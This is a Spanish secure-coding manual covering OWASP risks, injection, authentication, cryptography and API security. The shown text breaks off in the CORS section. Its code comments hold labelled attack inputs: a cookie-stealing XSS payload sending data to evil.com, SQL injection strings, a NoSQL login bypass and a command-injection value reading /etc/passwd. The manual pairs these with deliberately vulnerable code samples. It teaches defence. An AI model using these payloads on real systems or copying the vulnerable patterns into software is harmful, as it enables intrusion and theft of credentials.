# Manual Completo de Seguridad en Desarrollo de Software
## Guía Profesional: De Vulnerabilidades a Aplicaciones Seguras

> Manual profesional sobre seguridad en desarrollo de software, vulnerabilidades comunes, mejores prácticas y herramientas de protección

---

## 📚 Índice

1. [Introducción](#1-introducción)
2. [El Problema que Resuelve](#2-el-problema-que-resuelve)
3. [OWASP Top 10](#3-owasp-top-10)
4. [Inyección de Código](#4-inyección-de-código)
5. [Autenticación y Autorización](#5-autenticación-y-autorización)
6. [Criptografía](#6-criptografía)
7. [Seguridad en APIs](#7-seguridad-en-apis)
8. [Cross-Site Scripting (XSS)](#8-cross-site-scripting-xss)
9. [Cross-Site Request Forgery (CSRF)](#9-cross-site-request-forgery-csrf)
10. [Gestión de Secretos](#10-gestión-de-secretos)
11. [HTTPS y TLS](#11-https-y-tls)
12. [Rate Limiting y DDoS](#12-rate-limiting-y-ddos)
13. [Logging y Auditoría](#13-logging-y-auditoría)
14. [Seguridad en CI/CD](#14-seguridad-en-cicd)
15. [Herramientas de Seguridad](#15-herramientas-de-seguridad)
16. [Casos Prácticos](#16-casos-prácticos)
17. [Errores Comunes](#17-errores-comunes)
18. [Preguntas Frecuentes](#18-preguntas-frecuentes)

---

## 1. Introducción

### 1.1 ¿Qué es Seguridad en Software?

**Seguridad en software** es el proceso de diseñar, desarrollar y mantener aplicaciones que protejan la información, prevengan accesos no autorizados y resistan ataques maliciosos.

```
Seguridad NO es:
❌ Solo agregar HTTPS al final
❌ Responsabilidad exclusiva del equipo de seguridad
❌ Un feature que se agrega después
❌ Solo prevenir hackers externos

Seguridad SÍ es:
✅ Parte integral del diseño desde el inicio
✅ Responsabilidad de todo el equipo
✅ Prevenir vulnerabilidades comunes (OWASP Top 10)
✅ Proteger datos de usuarios
✅ Cumplir regulaciones (GDPR, PCI-DSS)
✅ Cultura de desarrollo seguro
```

### 1.2 Principios Fundamentales

**1. Principio de Menor Privilegio (Least Privilege)**
```
Usuario/Sistema solo tiene permisos mínimos necesarios

❌ MAL: Usuario regular con permisos de admin
✅ BIEN: Usuario regular solo puede ver sus propios datos
```

**2. Defensa en Profundidad (Defense in Depth)**
```
Múltiples capas de seguridad

Capas:
├── Firewall (red)
├── Authentication (aplicación)
├── Authorization (lógica de negocio)
├── Encryption (datos)
├── Logging (auditoría)
└── Monitoring (detección)
```

**3. Fallar de Forma Segura (Fail Securely)**
```
❌ MAL: Si auth falla, dar acceso por defecto
✅ BIEN: Si auth falla, denegar acceso
```

**4. No Confiar en el Cliente (Never Trust User Input)**
```
❌ MAL: Validar solo en frontend
✅ BIEN: Validar SIEMPRE en backend también
```

### 1.3 Estadísticas de Seguridad

```
Costos de brechas de seguridad:

Promedio global (2024):       $4.45 millones por brecha
Tiempo promedio detección:    207 días
Tiempo promedio contención:   73 días

Ejemplos reales:
- Equifax (2017):             $1,400 millones (datos de 147M personas)
- Capital One (2019):         $190 millones (100M clientes)
- SolarWinds (2020):          $18,000 afectados (cadena de suministro)
- Log4Shell (2021):           Millones de sistemas vulnerables

ROI de seguridad:
- Prevenir brecha:            $1 invertido
- Detectar temprano:          $10 para remediar
- Detectar tarde:             $100+ para remediar
- Brecha con daño legal:      $1,000+ en costos totales
```

---

## 2. El Problema que Resuelve

### 2.1 Vulnerabilidades Reales

**Problema 1: SQL Injection**

```java
// ❌ VULNERABLE - SQL Injection
@GetMapping("/users")
public List<User> searchUsers(@RequestParam String name) {
    String query = "SELECT * FROM users WHERE name = '" + name + "'";
    return jdbcTemplate.query(query, userRowMapper);
}

// Ataque:
// GET /users?name='; DROP TABLE users; --
// Query ejecutado: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
// Resultado: ¡Tabla eliminada!

// ✅ SEGURO - Prepared Statements
@GetMapping("/users")
public List<User> searchUsers(@RequestParam String name) {
    String query = "SELECT * FROM users WHERE name = ?";
    return jdbcTemplate.query(query, userRowMapper, name);
}
// Input malicioso se trata como string, no como SQL
```

**Problema 2: XSS (Cross-Site Scripting)**

```javascript
// ❌ VULNERABLE - XSS
function displayComment(comment) {
  document.getElementById('comments').innerHTML = comment;
}

// Ataque:
// comment = "<script>fetch('http://evil.com?cookie='+document.cookie)</script>"
// Resultado: Cookies robadas

// ✅ SEGURO - Sanitización
function displayComment(comment) {
  const sanitized = DOMPurify.sanitize(comment);
  document.getElementById('comments').innerHTML = sanitized;
}

// O mejor aún, usar textContent:
function displayComment(comment) {
  const div = document.createElement('div');
  div.textContent = comment; // Auto-escaped
  document.getElementById('comments').appendChild(div);
}
```

**Problema 3: Passwords en Plain Text**

```java
// ❌ VULNERABLE - Passwords sin hash
public void registerUser(String username, String password) {
    User user = new User();
    user.setUsername(username);
    user.setPassword(password); // ¡Plain text!
    userRepository.save(user);
}
// Si hackean la DB, tienen todas las passwords

// ✅ SEGURO - BCrypt hashing
@Service
public class UserService {

    @Autowired
    private PasswordEncoder passwordEncoder; // BCrypt

    public void registerUser(String username, String password) {
        User user = new User();
        user.setUsername(username);
        // Hash con salt automático
        user.setPasswordHash(passwordEncoder.encode(password));
        userRepository.save(user);
    }

    public boolean login(String username, String password) {
        User user = userRepository.findByUsername(username);
        if (user == null) return false;

        // Compara hash de forma segura
        return passwordEncoder.matches(password, user.getPasswordHash());
    }
}
```

---

## 3. OWASP Top 10

### 3.1 OWASP Top 10 (2021) - Las 10 Vulnerabilidades Más Críticas

```
┌────────────────────────────────────────────────────────────┐
│  1. Broken Access Control (Control de Acceso Roto)         │
│     - 94% de aplicaciones tienen algún problema            │
│     - Usuarios acceden a recursos sin autorización         │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  2. Cryptographic Failures (Fallas Criptográficas)         │
│     - Exposición de datos sensibles                        │
│     - Passwords, tarjetas de crédito sin cifrar            │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  3. Injection (Inyección)                                   │
│     - SQL, NoSQL, OS, LDAP injection                       │
│     - 274,000+ ocurrencias detectadas                      │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  4. Insecure Design (Diseño Inseguro)                      │
│     - Falta de threat modeling                             │
│     - Arquitectura sin seguridad                           │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  5. Security Misconfiguration (Configuración Incorrecta)   │
│     - Permisos por defecto                                 │
│     - Puertos abiertos innecesariamente                    │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  6. Vulnerable Components (Componentes Vulnerables)        │
│     - Librerías desactualizadas (Log4Shell)                │
│     - Dependencias con CVEs conocidos                      │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  7. Authentication Failures (Fallas de Autenticación)      │
│     - Session fixation, credential stuffing               │
│     - Passwords débiles permitidos                         │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  8. Software and Data Integrity Failures                   │
│     - CI/CD sin verificación                               │
│     - Deserialización insegura                             │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  9. Security Logging Failures (Fallas en Logging)          │
│     - No registrar intentos de login fallidos              │
│     - Logs sin protección                                  │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│  10. Server-Side Request Forgery (SSRF)                    │
│      - App hace requests a URLs no validadas               │
│      - Acceso a recursos internos                          │
└────────────────────────────────────────────────────────────┘
```

---

## 4. Inyección de Código

### 4.1 SQL Injection

**Concepto:**
```
Atacante inserta código SQL malicioso en inputs
para manipular o robar datos de la base de datos
```

**Ejemplo Vulnerable:**

```java
// ❌ VULNERABLE
@RestController
public class ProductController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @GetMapping("/products/search")
    public List<Product> search(@RequestParam String name) {
        // NUNCA concatenar strings para SQL
        String sql = "SELECT * FROM products WHERE name = '" + name + "'";
        return jdbcTemplate.query(sql, productRowMapper);
    }
}

// Ataques posibles:
// 1. Ver todos los productos:
//    GET /products/search?name=' OR '1'='1
//    Query: SELECT * FROM products WHERE name = '' OR '1'='1'
//    Resultado: Muestra TODOS los productos

// 2. Eliminar tabla:
//    GET /products/search?name='; DROP TABLE products; --
//    Query: SELECT * FROM products WHERE name = ''; DROP TABLE products; --'

// 3. Robar datos de otra tabla:
//    GET /products/search?name=' UNION SELECT username, password FROM users --
```

**Solución Segura:**

```java
// ✅ SEGURO - Prepared Statements
@RestController
public class ProductController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @GetMapping("/products/search")
    public List<Product> search(@RequestParam String name) {
        // Usar placeholders (?)
        String sql = "SELECT * FROM products WHERE name = ?";
        return jdbcTemplate.query(sql, productRowMapper, name);
    }

    // Con múltiples parámetros
    @GetMapping("/products/filter")
    public List<Product> filter(
        @RequestParam String category,
        @RequestParam BigDecimal minPrice
    ) {
        String sql = "SELECT * FROM products WHERE category = ? AND price >= ?";
        return jdbcTemplate.query(sql, productRowMapper, category, minPrice);
    }
}

// ✅ MEJOR - JPA/Hibernate con Named Parameters
@Repository
public interface ProductRepository extends JpaRepository<Product, Long> {

    // Query methods - safe por defecto
    List<Product> findByNameContaining(String name);

    // JPQL con named parameters
    @Query("SELECT p FROM Product p WHERE p.name = :name")
    List<Product> searchByName(@Param("name") String name);

    // Native query SOLO con parámetros
    @Query(
        value = "SELECT * FROM products WHERE name = :name",
        nativeQuery = true
    )
    List<Product> nativeSearchByName(@Param("name") String name);
}
```

### 4.2 NoSQL Injection

```javascript
// ❌ VULNERABLE - MongoDB
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // PELIGRO: Si username = {"$ne": null}
  // Encuentra cualquier user con password cualquiera
  const user = await User.findOne({
    username: username,
    password: password
  });

  if (user) {
    res.json({ success: true });
  }
});

// Ataque:
// POST /login
// { "username": {"$ne": null}, "password": {"$ne": null} }
// Bypasea autenticación completamente

// ✅ SEGURO
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Validar que sean strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  // Buscar solo con valores string
  const user = await User.findOne({
    username: String(username)
  });

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Usar bcrypt para comparar passwords
  const isValid = await bcrypt.compare(password, user.passwordHash);

  if (isValid) {
    res.json({ success: true, token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### 4.3 Command Injection

```java
// ❌ VULNERABLE - OS Command Injection
@GetMapping("/ping")
public String ping(@RequestParam String host) {
    try {
        // NUNCA ejecutar comandos con input del usuario
        Process process = Runtime.getRuntime()
            .exec("ping -c 3 " + host);

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );

        return reader.lines().collect(Collectors.joining("\n"));
    } catch (IOException e) {
        return "Error: " + e.getMessage();
    }
}

// Ataque:
// GET /ping?host=google.com; cat /etc/passwd
// Ejecuta: ping -c 3 google.com; cat /etc/passwd
// Resultado: Expone archivo de passwords del sistema

// ✅ SEGURO - Validar y sanitizar input
@GetMapping("/ping")
public String ping(@RequestParam String host) {
    // 1. Validar formato
    if (!isValidHost(host)) {
        throw new IllegalArgumentException("Invalid host format");
    }

    try {
        // 2. Usar array en vez de string (no interpreta shell)
        ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", host);
        pb.redirectErrorStream(true);

        Process process = pb.start();

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );

        return reader.lines().collect(Collectors.joining("\n"));
    } catch (IOException e) {
        log.error("Ping failed for host: {}", host, e);
        return "Ping failed";
    }
}

private boolean isValidHost(String host) {
    // Solo permitir hostname o IP válidos
    String hostPattern = "^[a-zA-Z0-9.-]+$";
    String ipPattern = "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";

    return host.matches(hostPattern) || host.matches(ipPattern);
}

// ✅ MEJOR - No ejecutar comandos del sistema
// Usar librerías Java nativas
@GetMapping("/ping")
public String ping(@RequestParam String host) {
    if (!isValidHost(host)) {
        throw new IllegalArgumentException("Invalid host");
    }

    try {
        InetAddress address = InetAddress.getByName(host);
        boolean reachable = address.isReachable(5000); // 5 segundos timeout

        return reachable
            ? "Host " + host + " is reachable"
            : "Host " + host + " is not reachable";
    } catch (IOException e) {
        return "Error checking host: " + host;
    }
}
```

---

## 5. Autenticación y Autorización

### 5.1 Diferencia entre Autenticación y Autorización

```
┌─────────────────────────────────────────────────────┐
│  AUTENTICACIÓN (Authentication)                     │
│  ¿QUIÉN eres?                                       │
│  → Verificar identidad del usuario                  │
│  → Login con username/password                      │
│  → Tokens JWT, OAuth, etc.                          │
└─────────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────┐
│  AUTORIZACIÓN (Authorization)                       │
│  ¿QUÉ puedes hacer?                                 │
│  → Verificar permisos del usuario                   │
│  → Roles (admin, user, guest)                       │
│  → Permisos granulares (read, write, delete)        │
└─────────────────────────────────────────────────────┘

Ejemplo:
1. Usuario se loguea con email/password → Autenticación
2. Usuario intenta ver orden #123 → ¿Es su orden? → Autorización
```

### 5.2 Autenticación Segura con JWT

**Configuración de Spring Security:**

```java
// SecurityConfig.java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Autowired
    private JwtAuthenticationFilter jwtAuthFilter;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable()) // Solo si usas JWT
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                // Endpoints públicos
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/public/**").permitAll()

                // Endpoints autenticados
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/user/**").hasAnyRole("USER", "ADMIN")

                // Todo lo demás requiere auth
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        // BCrypt con strength 12 (más seguro que default 10)
        return new BCryptPasswordEncoder(12);
    }
}
```

**Service de Autenticación:**

```java
@Service
public class AuthService {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private JwtService jwtService;

    // ══════════════════════════════════════════════════════
    // REGISTRO
    // ══════════════════════════════════════════════════════

    public AuthResponse register(RegisterRequest request) {
        // 1. Validar email no existe
        if (userRepository.existsByEmail(request.getEmail())) {
            throw new EmailAlreadyExistsException();
        }

        // 2. Validar password strength
        validatePasswordStrength(request.getPassword());

        // 3. Crear usuario
        User user = new User();
        user.setEmail(request.getEmail());
        user.setName(request.getName());

        // 4. Hash password con BCrypt
        user.setPasswordHash(passwordEncoder.encode(request.getPassword()));

        // 5. Asignar rol default
        user.setRole(Role.USER);

        user = userRepository.save(user);

        // 6. Generar JWT
        String token = jwtService.generateToken(user);

        return new AuthResponse(token, user);
    }

    // ══════════════════════════════════════════════════════
    // LOGIN
    // ══════════════════════════════════════════════════════

    public AuthResponse login(LoginRequest request) {
        // 1. Buscar usuario por email
        User user = userRepository.findByEmail(request.getEmail())
            .orElseThrow(() -> new InvalidCredentialsException());

        // 2. Verificar password
        if (!passwordEncoder.matches(request.getPassword(), user.getPasswordHash())) {
            // Log intento fallido
            logFailedLoginAttempt(user.getEmail());
            throw new InvalidCredentialsException();
        }

        // 3. Verificar cuenta no bloqueada
        if (user.isLocked()) {
            throw new AccountLockedException();
        }

        // 4. Resetear contador de intentos fallidos
        user.setFailedLoginAttempts(0);
        userRepository.save(user);

        // 5. Generar JWT
        String token = jwtService.generateToken(user);

        // 6. Log login exitoso
        logSuccessfulLogin(user.getEmail());

        return new AuthResponse(token, user);
    }

    // ══════════════════════════════════════════════════════
    // VALIDACIONES
    // ══════════════════════════════════════════════════════

    private void validatePasswordStrength(String password) {
        if (password.length() < 8) {
            throw new WeakPasswordException("Password must be at least 8 characters");
        }

        // Verificar complejidad
        boolean hasUpperCase = password.matches(".*[A-Z].*");
        boolean hasLowerCase = password.matches(".*[a-z].*");
        boolean hasDigit = password.matches(".*\\d.*");
        boolean hasSpecial = password.matches(".*[!@#$%^&*()].*");

        if (!hasUpperCase || !hasLowerCase || !hasDigit) {
            throw new WeakPasswordException(
                "Password must contain uppercase, lowercase, and numbers"
            );
        }

        // Verificar no es password común
        if (isCommonPassword(password)) {
            throw new WeakPasswordException("Password is too common");
        }
    }

    private boolean isCommonPassword(String password) {
        // Lista de passwords comunes (cargar de archivo)
        Set<String> commonPasswords = Set.of(
            "password", "12345678", "qwerty", "abc123",
            "password123", "admin", "letmein"
        );
        return commonPasswords.contains(password.toLowerCase());
    }

    private void logFailedLoginAttempt(String email) {
        User user = userRepository.findByEmail(email).orElse(null);
        if (user != null) {
            user.setFailedLoginAttempts(user.getFailedLoginAttempts() + 1);

            // Bloquear después de 5 intentos
            if (user.getFailedLoginAttempts() >= 5) {
                user.setLocked(true);
                user.setLockedUntil(LocalDateTime.now().plusMinutes(30));
            }

            userRepository.save(user);
        }
    }
}
```

**JWT Service:**

```java
@Service
public class JwtService {

    @Value("${jwt.secret}")
    private String secretKey;

    @Value("${jwt.expiration}")
    private long jwtExpiration; // 24 horas en ms

    public String generateToken(User user) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("userId", user.getId());
        claims.put("email", user.getEmail());
        claims.put("role", user.getRole().name());

        return Jwts.builder()
            .setClaims(claims)
            .setSubject(user.getEmail())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + jwtExpiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
    }

    public boolean isTokenValid(String token, User user) {
        final String email = extractEmail(token);
        return (email.equals(user.getEmail()) && !isTokenExpired(token));
    }

    private boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }

    private Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }

    public String extractEmail(String token) {
        return extractClaim(token, Claims::getSubject);
    }

    private <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }

    private Claims extractAllClaims(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody();
    }

    private Key getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secretKey);
        return Keys.hmacShaKeyFor(keyBytes);
    }
}
```

### 5.3 Autorización Basada en Roles

```java
// ❌ VULNERABLE - Sin verificación de permisos
@RestController
@RequestMapping("/api/orders")
public class OrderController {

    @GetMapping("/{id}")
    public Order getOrder(@PathVariable Long id) {
        // Cualquier usuario autenticado puede ver cualquier orden
        return orderRepository.findById(id).orElseThrow();
    }

    @DeleteMapping("/{id}")
    public void deleteOrder(@PathVariable Long id) {
        // Cualquiera puede eliminar cualquier orden
        orderRepository.deleteById(id);
    }
}

// ✅ SEGURO - Con autorización
@RestController
@RequestMapping("/api/orders")
public class OrderController {

    @Autowired
    private OrderService orderService;

    // Solo el dueño de la orden puede verla
    @GetMapping("/{id}")
    public Order getOrder(
        @PathVariable Long id,
        @AuthenticationPrincipal User currentUser
    ) {
        Order order = orderRepository.findById(id)
            .orElseThrow(() -> new OrderNotFoundException());

        // Verificar ownership
        if (!order.getCustomer().getId().equals(currentUser.getId())
            && !currentUser.isAdmin()) {
            throw new ForbiddenException("Not your order");
        }

        return order;
    }

    // Solo admin puede eliminar
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteOrder(@PathVariable Long id) {
        orderRepository.deleteById(id);
    }

    // Usuario puede cancelar solo sus propias órdenes
    @PostMapping("/{id}/cancel")
    public Order cancelOrder(
        @PathVariable Long id,
        @AuthenticationPrincipal User currentUser
    ) {
        return orderService.cancelOrder(id, currentUser);
    }
}

// Service con lógica de autorización
@Service
public class OrderService {

    public Order cancelOrder(Long orderId, User currentUser) {
        Order order = orderRepository.findById(orderId)
            .orElseThrow(() -> new OrderNotFoundException());

        // Solo el dueño o admin puede cancelar
        if (!order.getCustomer().getId().equals(currentUser.getId())
            && !currentUser.hasRole(Role.ADMIN)) {
            throw new ForbiddenException("Cannot cancel this order");
        }

        // Solo órdenes pendientes se pueden cancelar
        if (!order.getStatus().equals(OrderStatus.PENDING)) {
            throw new IllegalStateException("Cannot cancel " + order.getStatus() + " order");
        }

        order.setStatus(OrderStatus.CANCELLED);
        return orderRepository.save(order);
    }
}
```

### 5.4 Control de Acceso Basado en Atributos (ABAC)

```java
// Autorización más granular basada en atributos

@Service
public class DocumentService {

    public Document getDocument(Long documentId, User currentUser) {
        Document doc = documentRepository.findById(documentId)
            .orElseThrow();

        // Verificar múltiples condiciones
        if (canAccessDocument(doc, currentUser)) {
            return doc;
        }

        throw new ForbiddenException("Access denied");
    }

    private boolean canAccessDocument(Document doc, User user) {
        // 1. Es el creador del documento
        if (doc.getCreatedBy().equals(user.getId())) {
            return true;
        }

        // 2. Es admin
        if (user.hasRole(Role.ADMIN)) {
            return true;
        }

        // 3. Está en la lista de colaboradores
        if (doc.getCollaborators().contains(user)) {
            return true;
        }

        // 4. Es del mismo departamento y documento es público en dept
        if (doc.isPublicInDepartment()
            && doc.getDepartment().equals(user.getDepartment())) {
            return true;
        }

        // 5. Tiene permiso específico otorgado
        if (hasExplicitPermission(doc, user, Permission.READ)) {
            return true;
        }

        return false;
    }
}
```

---

## 6. Criptografía

### 6.1 Hashing de Passwords

```java
// ❌ NUNCA hacer esto
public class BadPasswordStorage {

    // ❌ Plain text
    public void storePassword(String password) {
        user.setPassword(password); // ¡NUNCA!
    }

    // ❌ MD5 (roto desde 2004)
    public String hashMD5(String password) {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] hash = md.digest(password.getBytes());
        return Base64.getEncoder().encodeToString(hash);
    }

    // ❌ SHA-1 o SHA-256 sin salt
    public String hashSHA256(String password) {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] hash = md.digest(password.getBytes());
        return Base64.getEncoder().encodeToString(hash);
    }
    // Problema: Rainbow tables pueden quebrar estos hashes
}

// ✅ CORRECTO - BCrypt con salt
@Configuration
public class SecurityConfig {

    @Bean
    public PasswordEncoder passwordEncoder() {
        // BCrypt automáticamente:
        // - Genera salt único por password
        // - Usa algoritmo resistente a rainbow tables
        // - Es computacionalmente costoso (previene brute force)
        return new BCryptPasswordEncoder(12); // Cost factor
    }
}

@Service
public class UserService {

    @Autowired
    private PasswordEncoder passwordEncoder;

    public void createUser(String email, String password) {
        User user = new User();
        user.setEmail(email);

        // Hash con BCrypt (incluye salt automático)
        String hashedPassword = passwordEncoder.encode(password);
        user.setPasswordHash(hashedPassword);

        userRepository.save(user);
    }

    public boolean authenticate(String email, String password) {
        User user = userRepository.findByEmail(email).orElse(null);
        if (user == null) {
            return false;
        }

        // Compara de forma segura (timing-attack resistant)
        return passwordEncoder.matches(password, user.getPasswordHash());
    }
}
```

**Comparación de algoritmos:**

```
┌──────────────────────────────────────────────────────┐
│  ALGORITMO  │  SEGURIDAD  │  USO                    │
├──────────────────────────────────────────────────────┤
│  MD5        │  ❌ ROTO    │  NUNCA usar             │
│  SHA-1      │  ❌ ROTO    │  NUNCA usar             │
│  SHA-256    │  ⚠️ OK      │  Solo con salt manual   │
│  BCrypt     │  ✅ SEGURO  │  Passwords (recomendado)│
│  Argon2     │  ✅ SEGURO  │  Passwords (mejor)      │
│  PBKDF2     │  ✅ SEGURO  │  Passwords (alternativa)│
└──────────────────────────────────────────────────────┘

Cost Factor (BCrypt):
- 10: ~100ms (default, ok)
- 12: ~400ms (recomendado)
- 14: ~1.5s  (muy seguro, puede ser lento)

Objetivo: Balance entre seguridad y UX
```

### 6.2 Cifrado de Datos Sensibles

```java
// ✅ Cifrado de datos en reposo (at rest)
@Service
public class EncryptionService {

    @Value("${encryption.secret-key}")
    private String secretKey;

    public String encrypt(String plainText) throws Exception {
        // Usar AES-256-GCM (autenticado)
        SecretKey key = generateKey();

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");

        // Generate unique IV
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);

        cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);

        byte[] encrypted = cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8));

        // Combinar IV + encrypted data
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);

        return Base64.getEncoder().encodeToString(combined);
    }

    public String decrypt(String encryptedText) throws Exception {
        byte[] combined = Base64.getDecoder().decode(encryptedText);

        // Extraer IV
        byte[] iv = new byte[12];
        System.arraycopy(combined, 0, iv, 0, iv.length);

        // Extraer datos cifrados
        byte[] encrypted = new byte[combined.length - iv.length];
        System.arraycopy(combined, iv.length, encrypted, 0, encrypted.length);

        SecretKey key = generateKey();

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);

        cipher.init(Cipher.DECRYPT_MODE, key, parameterSpec);

        byte[] decrypted = cipher.doFinal(encrypted);

        return new String(decrypted, StandardCharsets.UTF_8);
    }

    private SecretKey generateKey() {
        // En producción, usar KeyStore o vault
        byte[] decodedKey = Base64.getDecoder().decode(secretKey);
        return new SecretKeySpec(decodedKey, "AES");
    }
}

// Uso para datos sensibles
@Entity
public class CreditCard {

    @Id
    private Long id;

    // ❌ NO guardar número completo en plain text
    // private String cardNumber;

    // ✅ Guardar solo últimos 4 dígitos en plain text
    @Column(length = 4)
    private String lastFourDigits;

    // ✅ Resto cifrado
    @Column(columnDefinition = "TEXT")
    private String encryptedCardNumber;

    @Transient
    private String cardNumber; // Solo en memoria

    // Cifrar antes de guardar
    @PrePersist
    @PreUpdate
    public void encryptData() {
        if (cardNumber != null) {
            this.lastFourDigits = cardNumber.substring(cardNumber.length() - 4);
            this.encryptedCardNumber = encryptionService.encrypt(cardNumber);
            this.cardNumber = null; // Limpiar de memoria
        }
    }

    // Descifrar al cargar
    @PostLoad
    public void decryptData() {
        if (encryptedCardNumber != null) {
            this.cardNumber = encryptionService.decrypt(encryptedCardNumber);
        }
    }
}
```

### 6.3 Cifrado en Tránsito (HTTPS/TLS)

```yaml
# application.yml - Spring Boot con HTTPS
server:
  port: 8443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${KEYSTORE_PASSWORD}
    key-store-type: PKCS12
    key-alias: tomcat

# Forzar HTTPS
security:
  require-ssl: true
```

```java
// Configurar redirección HTTP → HTTPS
@Configuration
public class HttpsConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .requiresChannel(channel -> channel
                .anyRequest().requiresSecure() // Force HTTPS
            )
            .headers(headers -> headers
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000) // 1 año
                )
            );

        return http.build();
    }
}
```

---

## 7. Seguridad en APIs

### 7.1 Rate Limiting

```java
// ✅ Rate Limiting con Bucket4j (Token Bucket Algorithm)

@Configuration
public class RateLimitConfig {

    @Bean
    public Bucket createBucket() {
        // 10 requests por minuto
        Bandwidth limit = Bandwidth.classic(10, Refill.intervally(10, Duration.ofMinutes(1)));
        return Bucket4j.builder()
            .addLimit(limit)
            .build();
    }
}

@Component
public class RateLimitFilter extends OncePerRequestFilter {

    // Cache de buckets por IP
    private final LoadingCache<String, Bucket> cache = Caffeine.newBuilder()
        .maximumSize(100_000)
        .expireAfterWrite(1, TimeUnit.HOURS)
        .build(key -> createBucket());

    @Override
    protected void doFilterInternal(
        HttpServletRequest request,
        HttpServletResponse response,
        FilterChain filterChain
    ) throws ServletException, IOException {

        String ip = getClientIP(request);
        Bucket bucket = cache.get(ip);

        if (bucket.tryConsume(1)) {
            // Request permitido
            filterChain.doFilter(request, response);
        } else {
            // Too many requests
            response.setStatus(429); // Too Many Requests
            response.setHeader("X-Rate-Limit-Retry-After-Seconds", "60");
            response.getWriter().write("Too many requests");
        }
    }

    private Bucket createBucket() {
        return Bucket4j.builder()
            .addLimit(Bandwidth.classic(10, Refill.intervally(10, Duration.ofMinutes(1))))
            .build();
    }

    private String getClientIP(HttpServletRequest request) {
        String xfHeader = request.getHeader("X-Forwarded-For");
        if (xfHeader == null) {
            return request.getRemoteAddr();
        }
        return xfHeader.split(",")[0];
    }
}
```

### 7.2 CORS (Cross-Origin Resource Sharing)

```java
// ❌ INSEGURO - Permitir cualquier origen
@Configuration
public class UnsafeCorsConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**")
                    .allowedOrigins("*") // ❌ PELIGROSO
                    .allowedMethods("*")
                    .allowedHeaders("*")
                    .allowCredentials(true); // ❌ No compatible con wildcard
            }
        };
    }
}

// ✅ SEGURO - Lista blanca de orígenes
@Configuration
public class CorsConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    // Solo orígenes permitidos
                    .allowedOrigins(
                        "https://myapp.com",
                        "https://www.myapp.com",
                        "https://app.myapp.com"
                    )
                    // Solo métodos necesarios
                    .allowedMethods("GET", "POST", "PUT", "DELETE")
                    // Headers específicos
